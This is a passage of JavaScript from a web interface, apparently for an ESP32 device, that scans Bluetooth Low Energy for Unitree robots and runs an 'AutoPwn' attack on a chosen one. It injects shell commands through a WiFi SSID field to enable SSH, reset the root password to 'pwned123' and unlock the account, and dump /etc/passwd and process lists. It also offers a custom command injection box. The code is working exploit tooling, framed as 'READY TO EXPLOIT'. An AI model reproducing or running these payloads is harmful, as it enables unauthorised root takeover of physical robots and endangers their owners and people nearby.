            devices.forEach((device, index) => {
                // Creating button for device
                
                const btn = document.createElement('div');
                btn.className = 'target-button';
                btn.dataset.deviceAddress = device.address; // Store address for persistence
                
                // Set initial pink styling
                const signalColor = device.rssi > -60 ? '#ff1493' : device.rssi > -70 ? '#ff69b4' : device.rssi > -80 ? '#ff1493' : '#dc143c';
                btn.style.borderColor = signalColor;
                btn.style.color = signalColor;
                btn.style.backgroundColor = signalColor + '20';
                
                // Check if this device is currently selected (for persistence)
                if (selectedDevice && selectedDevice.address === device.address) {
                    btn.classList.add('selected');
                    btn.style.borderColor = '#32ff32';
                    btn.style.backgroundColor = 'rgba(50,255,50,0.2)';
                }
                
                btn.onclick = () => {
                    
                    // Remove selected class from all buttons first
                    document.querySelectorAll('.target-button').forEach(b => {
                        b.classList.remove('selected');
                        const originalColor = b.dataset.deviceAddress === device.address ? signalColor : '#ff1493';
                        b.style.borderColor = originalColor;
                        b.style.backgroundColor = originalColor + '20';
                    });
                    
                    // Add selected class and green styling to clicked button
                    btn.classList.add('selected');
                    btn.style.borderColor = '#32ff32';
                    btn.style.backgroundColor = 'rgba(50,255,50,0.2)';
                    
                    selectDevice(device);
                };
                
                btn.innerHTML = 
                    '<div style="font-size:18px; margin-bottom:8px; font-weight:bold;">' + device.name + '</div>' +
                    '<div style="font-size:13px; opacity:0.9; line-height:1.4;">' +
                    'MAC: ' + device.address + '<br>' +
                    'Signal: ' + device.rssi + 'dBm<br>' +
                    'UUID: <span style="color: #89CFF0;">' + device.uuid + '</span><br>' +
                    'Status: <span style="color:#32ff32;">READY TO EXPLOIT</span>' +
                    '</div>';
                
                buttons.appendChild(btn);
                // Button added to DOM
            });
            
            // showTargets completed
        }
        
        function selectDevice(device) {
            
            addLog('TARGET SELECTED: ' + device.name + ' [' + device.address + ']', 'detection');
            if (device.uuid && device.uuid !== 'N/A') {
                addLog('└─ Selected UUID: ' + device.uuid, 'uuid');
            }
            selectedDevice = device;
            
            // Persist selection to localStorage for browser refresh survival
            localStorage.setItem('selectedDevice', JSON.stringify(device));
            
            // Save complete state
            saveState();
            
            // Update selected target display
            const targetDisplay = document.getElementById('selectedTarget');
            
            targetDisplay.innerHTML = 
                '<strong>SELECTED TARGET:</strong><br>' +
                'Model: ' + device.name + '<br>' +
                'Address: ' + device.address + '<br>' +
                'Signal: ' + device.rssi + 'dBm<br>' +
                'UUID: <span style="color: #89CFF0;">' + device.uuid + '</span>';
            
            targetDisplay.style.borderColor = '#32ff32';
            targetDisplay.style.backgroundColor = 'rgba(50, 255, 50, 0.1)';
            targetDisplay.style.color = '#32ff32';
            
            // Enable attack buttons
            const autoPwnBtn = document.getElementById('autoPwnButton');
            console.log('Enabling AutoPwn button');
            autoPwnBtn.disabled = false;
            autoPwnBtn.textContent = 'START AUTOPWN ON ' + device.name.toUpperCase();
            autoPwnBtn.style.background = 'linear-gradient(45deg, #32ff32, #69ff69)';
            autoPwnBtn.style.color = '#0a0a0a';
            
            addLog('Target ready for exploitation: ' + device.name, 'success');
            addLog('AutoPwn button enabled for: ' + device.address, 'info');
            console.log('=== TARGET SELECTION COMPLETE ===');
        }
        
        // Remove this overcomplicated function - replaced with simple showTargets()

        function displayDevices(devices) {
            console.log('displayDevices called with:', devices);
            addLog('displayDevices called with ' + devices.length + ' devices', 'info');
            
            const deviceList = document.getElementById('deviceList');
            const targetsFound = document.getElementById('targetsFound');
            
            if (devices.length === 0) {
                deviceList.value = 'No Unitree robots detected.<br><br>Ensure targets are:<br>- Powered on and active<br>- Within BLE range (10-30m)<br>- Not in sleep mode<br><br>Supported models: Go2, G1, H1, B2';
                targetsFound.textContent = '0';
                addLog('Scan completed - no targets found', 'info');
                return;
            }
            
            let output = 'DISCOVERED UNITREE ROBOTS (' + devices.length + '):<br>';
            output += '='.repeat(40) + '<br><br>';
            
            devices.forEach((device, index) => {
                const rssi = device.rssi ? device.rssi + 'dBm' : 'N/A';
                const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
                const signalStrength = device.rssi > -60 ? 'Excellent' : device.rssi > -70 ? 'Good' : device.rssi > -80 ? 'Fair' : 'Weak';
                
                output += 'TARGET #' + (index + 1) + '<br>';
                output += 'Address: ' + device.address + '<br>';
                output += 'Model: ' + model + '<br>';
                output += 'Signal: ' + rssi + ' (' + signalStrength + ')<br>';
                output += 'Status: Ready for exploitation<br>';
                output += '-'.repeat(30) + '<br><br>';
            });
            
            output += 'Click a target above to select for AutoPwn';
            
            deviceList.value = output;
            targetsFound.textContent = devices.length;
            
            // Store devices for selection and create clickable interface
            window.discoveredDevices = devices;
            
            // Add click handlers for device selection
            deviceList.onclick = function(e) {
                // Simple device selection by parsing the clicked area
                const lines = this.value.split('<br>');
                const clickPos = this.selectionStart;
                let charCount = 0;
                let selectedIndex = -1;
                
                for (let i = 0; i < lines.length; i++) {
                    if (charCount <= clickPos && clickPos <= charCount + lines[i].length) {
                        if (lines[i].startsWith('TARGET #')) {
                            selectedIndex = parseInt(lines[i].replace('TARGET #', '')) - 1;
                            break;
                        }
                    }
                    charCount += lines[i].length + 1; // +1 for newline
                }
                
                if (selectedIndex >= 0 && selectedIndex < devices.length) {
                    selectDevice(devices[selectedIndex]);
                }
            };
        }

        // REMOVED: Duplicate selectDevice function - using the main one above
        
        function toggleScan() {
            const buttonText = document.getElementById('scanButton').textContent;
            
            if (buttonText === 'Stop Scanning') {
                // Stop continuous scanning
                addLog('Scanning stopped', 'info');
                
                // Clear all frontend state immediately
                isScanning = false;
                scanRunning = false;
                
                // Clear all intervals
                if (realtimePoll) {
                    clearInterval(realtimePoll);
                    realtimePoll = null;
                }
                if (continuousTimer) {
                    clearTimeout(continuousTimer);
                    continuousTimer = null;
                }
                if (scanInterval) {
                    clearTimeout(scanInterval);
                    scanInterval = null;
                }
                
                // Update UI immediately
                document.getElementById('scanButton').textContent = 'Start BLE Scan';
                document.getElementById('scanStatus').innerHTML = '<span style="color: #cccccc;">Ready to scan</span>';
                document.getElementById('deviceList').value = 'Scanning stopped by user';
                
                // Call backend to stop continuous scanning
                fetch('/stop', { method: 'POST' })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success && data.devices) {
                            updateDeviceList(data.devices);
                        }
                    })
                    .catch(error => {
                        addLog('Stop error: ' + error.message, 'error');
                    });
                
                saveState();
                
            } else {
                // Start continuous scanning
                addLog('Starting BLE scan for Unitree robots...', 'info');
                isScanning = true;
                startContinuousScanning();
                document.getElementById('scanButton').textContent = 'Stop Scanning';
            }
        }
        
        function startScan() {
            isScanning = true;
            scanCount++;
            document.getElementById('scanButton').textContent = 'Stop Scanning';
            document.getElementById('scanIndicator').style.display = 'block';
            document.getElementById('totalScans').textContent = scanCount;
            
            // Clear previous results
            document.getElementById('deviceList').value = 'Initializing BLE scan...';
            document.getElementById('targetsFound').textContent = '0';
            
            addLog('=== BLE SCAN #' + scanCount + ' INITIATED ===', 'scan');
            addLog('Scanning for Unitree Go2, G1, H1, B2 robots...', 'info');
            
            let scanStartTime = Date.now();
            let dotCount = 1;
            const updateTimer = setInterval(() => {
                if (!isScanning) {
                    clearInterval(updateTimer);
                    return;
                }
                const elapsed = Math.floor((Date.now() - scanStartTime) / 1000);
                document.getElementById('scanDuration').textContent = elapsed + 's';
                
                // Animate scanning dots (1, 2, 3, then back to 1)
                dotCount = (dotCount % 3) + 1;
                const dots = '.'.repeat(dotCount);
                document.getElementById('scanDots').textContent = dots;
                document.getElementById('deviceList').value = 'Scanning BLE devices' + dots + '<br>Elapsed: ' + elapsed + 's<br>Searching for Unitree robots' + dots;
            }, 500);
            
            // Add scan progress logging
            addLog('BLE scan in progress - searching frequency bands...', 'info');
            
            fetch('/scan', { method: 'POST' })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Scan request failed: HTTP ' + response.status);
                    }
                    return response.json();
                })
                .then(data => {
                    clearInterval(updateTimer);
                    const foundCount = data.devices ? data.devices.length : 0;
                    
                    // Update scan status
                    document.getElementById('scanIndicator').style.display = 'none';
                    const finalDuration = Math.floor((Date.now() - scanStartTime) / 1000);
                    document.getElementById('scanDuration').textContent = finalDuration + 's';
                    
                    // Log detailed results
                    addLog('BLE scan #' + scanCount + ' completed in ' + finalDuration + 's', 'success');
                    addLog('Discovered ' + foundCount + ' Unitree robot(s)', foundCount > 0 ? 'success' : 'info');
                    
                    if (foundCount > 0) {
                        data.devices.forEach((device, index) => {
                            const model = device.name ? device.name.replace('Unitree_', '') : 'Unknown';
                            addLog('Target ' + (index + 1) + ': ' + device.address + ' (' + model + ') RSSI: ' + device.rssi + 'dBm', 'info');
                        });
                    } else {
                        addLog('No Unitree robots in range - ensure targets are powered on', 'info');
                    }
                    
                    displayDevices(data.devices || []);
                    
                    if (continuousScanning && isScanning) {
                        addLog('Continuous mode: Next scan in 5 seconds...', 'info');
                        scanInterval = setTimeout(() => {
                            if (continuousScanning && isScanning) {
                                startScan();
                            }
                        }, 5000);
                    } else {
                        stopScanning();
                    }
                })
                .catch(error => {
                    clearInterval(updateTimer);
                    document.getElementById('scanIndicator').style.display = 'none';
                    document.getElementById('deviceList').value = 'Scan failed: ' + error.message;
                    
                    addLog('BLE scan #' + scanCount + ' FAILED: ' + error.message, 'error');
                    addLog('Check device status and retry scanning', 'error');
                    
                    if (!continuousScanning) {
                        stopScanning();
                    } else {
                        addLog('Continuous mode: Retrying in 10 seconds...', 'info');
                        scanInterval = setTimeout(() => {
                            if (continuousScanning && isScanning) {
                                startScan();
                            }
                        }, 10000);
                    }
                });
        }

        function quickExploit(command) {
            if (!selectedDevice) {
                alert('Please select a target device first');
                addLog('Exploit attempt failed - no target selected', 'error');
                return;
            }
            
            addLog('Executing ' + command + ' on ' + selectedDevice.address, 'exploit');
            
            fetch('/exploit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: selectedDevice.address,
                    command: command,
                    method: 'ssid'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    exploitStats.successful++;
                    document.getElementById('successfulExploits').textContent = exploitStats.successful;
                    addLog(command + ' executed successfully on ' + selectedDevice.address, 'success');
                } else {
                    exploitStats.failed++;
                    document.getElementById('failedExploits').textContent = exploitStats.failed;
                    addLog(command + ' failed on ' + selectedDevice.address + ': ' + data.error, 'error');
                }
                saveState(); // Persist exploit stats
            })
            .catch(error => {
                exploitStats.failed++;
                document.getElementById('failedExploits').textContent = exploitStats.failed;
                addLog('Exploit communication error: ' + error.message, 'error');
                saveState(); // Persist exploit stats
            });
        }

        function customExploit() {
            const command = document.getElementById('customCommand').value.trim();
            const method = document.getElementById('injectionMethod').value;
            
            if (!command) {
                alert('Please enter a custom command');
                return;
            }
            
            if (!selectedDevice) {
                alert('Please select a target device first');
                return;
            }
            
            addLog('Executing custom command "' + command + '" via ' + method + ' injection', 'exploit');
            
            fetch('/exploit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target: selectedDevice.address,
                    command: command,
                    method: method
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    exploitStats.successful++;
                    document.getElementById('successfulExploits').textContent = exploitStats.successful;
                    addLog('Custom command executed successfully', 'success');
                } else {
                    exploitStats.failed++;
                    document.getElementById('failedExploits').textContent = exploitStats.failed;
                    addLog('Custom command failed: ' + data.error, 'error');
                }
            })
            .catch(error => {
                exploitStats.failed++;
                document.getElementById('failedExploits').textContent = exploitStats.failed;
                addLog('Custom exploit error: ' + error.message, 'error');
            });
        }

        function getSystemInfo() {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('freeHeap').textContent = Math.floor(data.freeHeap / 1024);
                    document.getElementById('uptime').textContent = data.uptime;
                    document.getElementById('wifiStatus').textContent = data.wifiStatus;
                    document.getElementById('bleStatus').textContent = data.bleStatus;
                })
                .catch(error => {
                    addLog('Failed to get system info: ' + error.message, 'error');
                });
        }

        async function startAutoPwn() {
            console.log('AutoPwn button clicked!');
            addLog('AutoPwn button clicked - starting diagnostics...', 'info');
            
            if (autoPwnRunning) {
                addLog('AutoPwn already running!', 'error');
                return;
            }
            
            if (!selectedDevice) {
                addLog('AUTOPWN FAILED: No target selected!', 'error');
                addLog('DEBUG: selectedDevice = ' + JSON.stringify(selectedDevice), 'error');
                document.getElementById('autoPwnStatus').innerHTML = '<span style="color: #ff6b6b;">ERROR: Select a target first</span>';
                return;
            }
            
            addLog('AutoPwn proceeding with target: ' + selectedDevice.name, 'info');
            
            // Bulletproof confirmation dialog
            if (!confirm('AUTOPWN WARNING: This will attempt full exploitation of ' + selectedDevice.name + ' (' + selectedDevice.address + ')\n\nThis will:\n- Connect via BLE\n- Inject WiFi credentials\n- Enable SSH access\n- Change root password\n- Extract system info\n\nProceed with AutoPwn?')) {
                addLog('AutoPwn cancelled by user', 'info');
                return;
            }
            
            autoPwnRunning = true;
            autoPwnCount++;
            document.getElementById('autoPwnCount').textContent = autoPwnCount;
            document.getElementById('autoPwnButton').textContent = 'AUTOPWN RUNNING...';
            document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #666666, #888888)';
            document.getElementById('autoPwnProgress').style.display = 'block';
            
            // Clear previous steps
            document.getElementById('stepsList').innerHTML = '';
            
            addLog('=== AUTOPWN #' + autoPwnCount + ' INITIATED ===', 'scan');
            addLog('Target: ' + selectedDevice.name + ' (' + selectedDevice.address + ')', 'info');
            
            const steps = [
                { name: 'System Check', progress: 15 },
                { name: 'BLE Connect + Handshake', progress: 30 },
                { name: 'WiFi Injection', progress: 50 },
                { name: 'SSH Enable', progress: 65 },
                { name: 'Root Access', progress: 80 },
                { name: 'System Extract', progress: 100 }
            ];
            
            // Add all steps as pending first
            for (let i = 0; i < steps.length; i++) {
                addAutoPwnStep(i + 1, steps[i].name, 'pending');
            }
            
            try {
                for (let i = 0; i < steps.length; i++) {
                    const step = steps[i];
                    const stepNumber = i + 1;
                    
                    // Update step to running
                    updateAutoPwnStep(stepNumber, 'running');
                    updateProgress(step.progress, step.name);
                    addLog('AutoPwn Step ' + stepNumber + '/7: ' + step.name, 'info');
                    
                    // Execute the actual step
                    const success = await executeAutoPwnStep(i, step.name);
                    
                    if (!success) {
                        updateAutoPwnStep(stepNumber, 'failed', 'Step execution failed');
                        throw new Error('Step ' + stepNumber + ' (' + step.name + ') failed');
                    }
                    
                    // Update step to success
                    updateAutoPwnStep(stepNumber, 'success');
                    
                    // Wait between steps for stability
                    await sleep(1500);
                }
                
                // Success
                updateProgress(100, 'AUTOPWN COMPLETE');
                document.getElementById('autoPwnStatus').innerHTML = '<span style="color: #32ff32;">AUTOPWN SUCCESS: Full exploitation completed!</span>';
                addLog('=== AUTOPWN #' + autoPwnCount + ' COMPLETED SUCCESSFULLY ===', 'success');
                exploitStats.successful++;
                document.getElementById('successfulExploits').textContent = exploitStats.successful;
                
            } catch (error) {
                updateProgress(0, 'AUTOPWN FAILED');
                document.getElementById('autoPwnStatus').innerHTML = '<span style="color: #ff6b6b;">AUTOPWN FAILED: ' + error.message + '</span>';
                addLog('=== AUTOPWN #' + autoPwnCount + ' FAILED ===', 'error');
                addLog('Error: ' + error.message, 'error');
                exploitStats.failed++;
                document.getElementById('failedExploits').textContent = exploitStats.failed;
                
                // Mark any remaining steps as failed
                for (let i = 0; i < steps.length; i++) {
                    const stepDiv = document.getElementById('step-' + (i + 1));
                    if (stepDiv && !stepDiv.innerHTML.includes('[SUCCESS]') && !stepDiv.innerHTML.includes('[FAILED]')) {
                        updateAutoPwnStep(i + 1, 'failed', 'AutoPwn terminated');
                    }
                }
            }
            
            // Reset UI
            autoPwnRunning = false;
            document.getElementById('autoPwnButton').textContent = 'START AUTOPWN';
            document.getElementById('autoPwnButton').style.background = 'linear-gradient(45deg, #ff6b6b, #ff8e8e)';
            // Keep the progress card visible after failures for troubleshooting
            if (document.getElementById('progressText').textContent.includes('AUTOPWN COMPLETE')) {
                setTimeout(() => {
                    document.getElementById('autoPwnProgress').style.display = 'none';
                }, 5000);
            }
        }
        
        async function executeAutoPwnStep(stepIndex, stepName) {
            const maxRetries = 3;
            const timeout = 10000; // 10 second timeout
            
            for (let attempt = 1; attempt <= maxRetries; attempt++) {
                try {
                    if (attempt > 1) {
                        addLog('Retry attempt ' + attempt + '/' + maxRetries + ' for: ' + stepName, 'info');
                        await sleep(2000); // Wait before retry
                    }
                    
                    switch(stepIndex) {
                        case 0: // System Check
                            addLog('Checking system health and BLE status...', 'info');
                            const statusResponse = await fetchWithTimeout('/status', timeout);
                            if (!statusResponse.ok) {
                                throw new Error('HTTP ' + statusResponse.status + ': System status check failed');
                            }
                            const statusData = await statusResponse.json();
                            
                            // Bulletproof checks with graceful fallbacks
                            const bleOk = (statusData.bleEnabled === true) || (String(statusData.bleStatus).toLowerCase() === 'active');
                            const heap = Number(statusData.freeHeap || 0);
                            const wifiMode = String(statusData.wifiStatus || '').toLowerCase();
                            const wifiConnected = (statusData.wifiConnected === true);
                            
                            if (!bleOk) {
                                throw new Error('BLE inactive');
                            }
                            if (heap > 0 && heap < 30000) {
                                addLog('Warning: Low memory ' + heap + ' bytes - continuing anyway', 'warning');
                            }
                            if (!wifiConnected && !(wifiMode.includes('ap') || wifiMode.includes('sta'))) {
                                addLog('Warning: WiFi state unknown - proceeding', 'warning');
                            }
                            
                            addLog('System check PASSED - BLE: ' + (statusData.bleStatus || 'Active') + ', Heap: ' + (heap > 0 ? Math.floor(heap/1024)+'KB' : 'N/A') + ', WiFi: ' + (statusData.wifiStatus || 'Unknown'), 'success');
                            return true;
                            
                        case 1: // BLE Connect + Handshake
                            addLog('Connecting to BLE and performing handshake...', 'info');
                            const handshakeResponse = await fetchWithTimeout('/handshake?target=' + encodeURIComponent(selectedDevice.address), timeout, {
                                method: 'POST'
                            });
                            
                            if (!handshakeResponse.ok) {
                                const errorText = await handshakeResponse.text();
                                throw new Error('BLE connection/handshake failed: HTTP ' + handshakeResponse.status + ' - ' + errorText);
                            }
                            
                            const handshakeResult = await handshakeResponse.json();
                            if (!handshakeResult.success) {
                                throw new Error('BLE handshake rejected: ' + (handshakeResult.error || 'Unknown error'));
                            }
                            
                            addLog('BLE connection and handshake COMPLETED successfully', 'success');
                            return true;
                            
                        case 2: // WiFi Injection
                            addLog('Injecting command via SSID (UniPwn method)...', 'info');
                            const wifiPayload = 'echo "PWNED_$(whoami)_$(date +%s)" > /tmp/unipwn.log';
                            
                            const wifiResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    target: selectedDevice.address,
                                    command: wifiPayload
                                })
                            });
                            
                            if (!wifiResponse.ok) {
                                const errorText = await wifiResponse.text();
                                throw new Error('WiFi injection failed: HTTP ' + wifiResponse.status + ' - ' + errorText);
                            }
                            
                            const wifiResult = await wifiResponse.json();
                            if (!wifiResult.success) {
                                throw new Error('WiFi injection rejected: ' + (wifiResult.error || 'Command injection blocked'));
                            }
                            
                            addLog('WiFi injection SUCCESSFUL - Command payload delivered', 'success');
                            return true;
                            
                        case 3: // SSH Enable
                            addLog('Enabling SSH daemon on target...', 'info');
                            const sshCommand = 'systemctl enable ssh && systemctl start ssh && echo "SSH_ENABLED_$(date +%s)" >> /tmp/unipwn.log';
                            
                            const sshResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    target: selectedDevice.address,
                                    command: sshCommand,
                                    method: 'ssid'
                                })
                            });
                            
                            if (!sshResponse.ok) {
                                const errorText = await sshResponse.text();
                                throw new Error('SSH enable failed: HTTP ' + sshResponse.status + ' - ' + errorText);
                            }
                            
                            const sshResult = await sshResponse.json();
                            if (!sshResult.success) {
                                throw new Error('SSH enable rejected: ' + (sshResult.error || 'Service control failed'));
                            }
                            
                            addLog('SSH daemon ENABLED - Remote access now available', 'success');
                            return true;
                            
                        case 4: // Root Access
                            addLog('Compromising root account...', 'info');
                            const rootCommand = 'echo "root:pwned123" | chpasswd && echo "ROOT_PWNED_$(date +%s)" >> /tmp/unipwn.log && passwd -u root';
                            
                            const rootResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    target: selectedDevice.address,
                                    command: rootCommand,
                                    method: 'ssid'
                                })
                            });
                            
                            if (!rootResponse.ok) {
                                const errorText = await rootResponse.text();
                                throw new Error('Root compromise failed: HTTP ' + rootResponse.status + ' - ' + errorText);
                            }
                            
                            const rootResult = await rootResponse.json();
                            if (!rootResult.success) {
                                throw new Error('Root access denied: ' + (rootResult.error || 'Password change failed'));
                            }
                            
                            addLog('ROOT ACCESS GAINED - Password changed to: pwned123', 'success');
                            return true;
                            
                        case 5: // System Extract
                            addLog('Extracting critical system information...', 'info');
                            const extractCommand = 'uname -a && cat /etc/passwd | head -10 && ps aux | head -10 && cat /tmp/unipwn.log 2>/dev/null || echo "No log found"';
                            
                            const extractResponse = await fetchWithTimeout('/exploit', timeout, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    target: selectedDevice.address,
                                    command: extractCommand,
                                    method: 'ssid'
                                })
                            });
                            
                            if (!extractResponse.ok) {
                                const errorText = await extractResponse.text();
                                throw new Error('System extraction failed: HTTP ' + extractResponse.status + ' - ' + errorText);
                            }
                            
                            const extractResult = await extractResponse.json();
                            if (!extractResult.success) {
                                throw new Error('Information extraction failed: ' + (extractResult.error || 'Command execution failed'));
                            }
                            
                            addLog('SYSTEM EXTRACTION COMPLETE - Critical data harvested', 'success');
                            if (extractResult.output) {
                                addLog('Extracted data preview: ' + extractResult.output.substring(0, 200) + '...', 'info');
                            }
                            return true;
                            
                        default:
                            throw new Error('Unknown step index: ' + stepIndex);
                    }
                } catch (error) {
                    addLog('Step ' + stepName + ' failed (attempt ' + attempt + '/' + maxRetries + '): ' + error.message, 'error');
                    
                    if (attempt === maxRetries) {
                        throw new Error('Step failed after ' + maxRetries + ' attempts: ' + error.message);
                    }
                    
                    // Progressive backoff delay
                    await sleep(attempt * 1000);
                }
            }
            
            return false;
        }
        
        async function fetchWithTimeout(url, timeout, options = {}) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), timeout);
            
            try {
                const response = await fetch(url, {
                    ...options,
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                return response;
            } catch (error) {
                clearTimeout(timeoutId);
                if (error.name === 'AbortError') {
                    throw new Error('Request timeout after ' + timeout + 'ms');
                }
                throw error;
            }
        }
        
        function updateProgress(percent, text) {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('progressText').textContent = percent + '% - ' + text;
        }
        
        function addAutoPwnStep(stepNumber, stepName, status = 'pending') {
            const stepsList = document.getElementById('stepsList');
            const timestamp = new Date().toLocaleTimeString();
            let statusColor = '#cccccc'; // pending
            let statusText = 'PENDING';
            
            if (status === 'running') {
                statusColor = '#ffff32';
                statusText = 'RUNNING';
            } else if (status === 'success') {
                statusColor = '#32ff32';
                statusText = 'SUCCESS';
            } else if (status === 'failed') {
                statusColor = '#ff3232';
                statusText = 'FAILED';
            }
            
            const stepDiv = document.createElement('div');
            stepDiv.id = 'step-' + stepNumber;
            stepDiv.style.marginBottom = '5px';
            stepDiv.style.padding = '3px 5px';
            stepDiv.style.borderRadius = '3px';
            stepDiv.style.backgroundColor = status === 'running' ? 'rgba(255,255,50,0.1)' : 
                                           status === 'success' ? 'rgba(50,255,50,0.1)' : 
                                           status === 'failed' ? 'rgba(255,50,50,0.1)' : 'rgba(255,255,255,0.05)';
            
            stepDiv.innerHTML = `<span style="color: #ffffff;">${timestamp}</span> ` +
                               `<span style="color: ${statusColor}; font-weight: bold;">[${statusText}]</span> ` +
                               `<span style="color: #ffffff;">Step ${stepNumber}: ${stepName}</span>`;
            
            stepsList.appendChild(stepDiv);
            stepsList.scrollTop = stepsList.scrollHeight;
        }
        
        function updateAutoPwnStep(stepNumber, status, errorMessage = '') {
            const stepDiv = document.getElementById('step-' + stepNumber);
            if (stepDiv) {
                let statusColor = '#cccccc';
                let statusText = 'PENDING';
                
                if (status === 'running') {
                    statusColor = '#ffff32';
                    statusText = 'RUNNING';
                } else if (status === 'success') {
                    statusColor = '#32ff32';
                    statusText = 'SUCCESS';
                } else if (status === 'failed') {
                    statusColor = '#ff3232';
                    statusText = 'FAILED';
                }
                
                const timestamp = new Date().toLocaleTimeString();
                const originalText = stepDiv.innerHTML.split('Step ' + stepNumber + ': ')[1];
                stepDiv.innerHTML = `<span style="color: #ffffff;">${timestamp}</span> ` +
                                   `<span style="color: ${statusColor}; font-weight: bold;">[${statusText}]</span> ` +
                                   `<span style="color: #ffffff;">Step ${stepNumber}: ${originalText}</span>`;
                
                if (errorMessage) {
                    const errorDiv = document.createElement('div');
                    errorDiv.style.marginLeft = '20px';
                    errorDiv.style.color = '#ff3232';
                    errorDiv.style.fontSize = '11px';
                    errorDiv.textContent = 'ERROR: ' + errorMessage;
                    stepDiv.appendChild(errorDiv);
                }
                
                stepDiv.style.backgroundColor = status === 'running' ? 'rgba(255,255,50,0.1)' : 
                                               status === 'success' ? 'rgba(50,255,50,0.1)' : 
                                               status === 'failed' ? 'rgba(255,50,50,0.1)' : 'rgba(255,255,255,0.05)';
            }
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // Hardware toggle functions
        function toggleBuzzer() {
            const buzzerEnabled = document.getElementById('buzzerEnabled').checked;
            fetch('/toggle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'setting=buzzer&value=' + (buzzerEnabled ? '1' : '0')
            })
            .then(response => response.text())
            .then(data => {
                addLog('Buzzer ' + (buzzerEnabled ? 'enabled' : 'disabled'), 'success');
            })
            .catch(error => {
                addLog('Failed to toggle buzzer: ' + error, 'error');
            });
        }

        function toggleLED() {
            const ledEnabled = document.getElementById('ledEnabled').checked;
            fetch('/toggle', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'setting=led&value=' + (ledEnabled ? '1' : '0')
            })
            .then(response => response.text())
            .then(data => {
                addLog('LED feedback ' + (ledEnabled ? 'enabled' : 'disabled'), 'success');
            })
            .catch(error => {
                addLog('Failed to toggle LED: ' + error, 'error');
            });
        }

        function saveHardwareSettings() {
            const buzzerEnabled = document.getElementById('buzzerEnabled').checked;
            const ledEnabled = document.getElementById('ledEnabled').checked;
            
            addLog('Saving hardware settings...', 'info');
            
            // Save both settings
            Promise.all([
                fetch('/toggle', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'setting=buzzer&value=' + (buzzerEnabled ? '1' : '0')
                }),
                fetch('/toggle', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'setting=led&value=' + (ledEnabled ? '1' : '0')
                })
            ])
            .then(responses => {
                addLog('Hardware settings saved successfully', 'success');
                addLog('Buzzer: ' + (buzzerEnabled ? 'enabled' : 'disabled'), 'info');
                addLog('LED: ' + (ledEnabled ? 'enabled' : 'disabled'), 'info');
            })
            .catch(error => {
                addLog('Failed to save hardware settings: ' + error, 'error');
            });
        }

        // Continuous scanning is now always enabled - no toggle needed
        
        function startContinuousScanning() {
            isScanning = true;
            scanDevices();
            saveState();
        }
        
        function loadHardwareSettings() {
            fetch('/hardware')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        // Set checkboxes based on ESP32 state
                        document.getElementById('buzzerEnabled').checked = data.buzzer;
                        document.getElementById('ledEnabled').checked = data.led;
                        addLog('Hardware settings loaded: Buzzer ' + (data.buzzer ? 'ON' : 'OFF') + ', LED ' + (data.led ? 'ON' : 'OFF'), 'success');
                    }
                })
                .catch(error => {
                    addLog('Failed to load hardware settings: ' + error.message, 'error');
                });
        }
        

        // Initialize on load
        // Global error handler
        window.onerror = function(msg, url, line, col, error) {
            console.error('JavaScript Error:', msg, 'at', line + ':' + col);
            addLog('JavaScript Error: ' + msg + ' at line ' + line, 'error');
            return false;
        };
        
        window.addEventListener('unhandledrejection', function(event) {
            console.error('Unhandled Promise Rejection:', event.reason);
            addLog('Promise Error: ' + event.reason, 'error');
        });
        
        document.addEventListener('DOMContentLoaded', function() {
            // Page loaded, get system info (DON'T clear targets on refresh)
            
            addLog('OUI Spy UniPwn Edition - Based on github.com/Bin4ry/UniPwn research', 'info');
            addLog('Ready for Unitree robot BLE exploitation', 'info');
            addLog('Page loaded - targets persist on refresh', 'info');
            
            // Clear legacy selectedDevice key and reset UI selection
            try { localStorage.removeItem('selectedDevice'); } catch (e) {}
            const sel = document.getElementById('selectedTarget');
            if (sel) {
                sel.innerHTML = 'No target selected - Click a robot above to select';
                sel.style.borderColor = '#ff6b6b';
                sel.style.backgroundColor = 'rgba(255, 107, 107, 0.1)';
                sel.style.color = '#ff6b6b';
            }
            // Reset scan status on page load
            document.getElementById('scanStatus').innerHTML = '<span style="color: #cccccc;">Ready to scan for Unitree robots</span>';
            
            // Load comprehensive state from localStorage
            const stateRestored = loadState();
            if (!stateRestored) {
                addLog('Starting fresh session - no previous state found', 'info');
            }
            
            // Start real-time operations log polling
            startSerialPolling();
            addLog('Real-time operations log active', 'success');
            getSystemInfo();
            setInterval(getSystemInfo, 10000);
            
            // Load hardware settings from ESP32
            loadHardwareSettings();

            // Disable background pre-scan polling to avoid stale detections from prior sessions
            if (backgroundPoll) {
                clearInterval(backgroundPoll);
                backgroundPoll = null;
            }
            
            // Serial log mirroring - fetch and display serial output in operations log
            setInterval(() => {
                fetch('/serial')
                    .then(r => r.json())
                    .then(data => {
                        if (data.success && data.serial) {
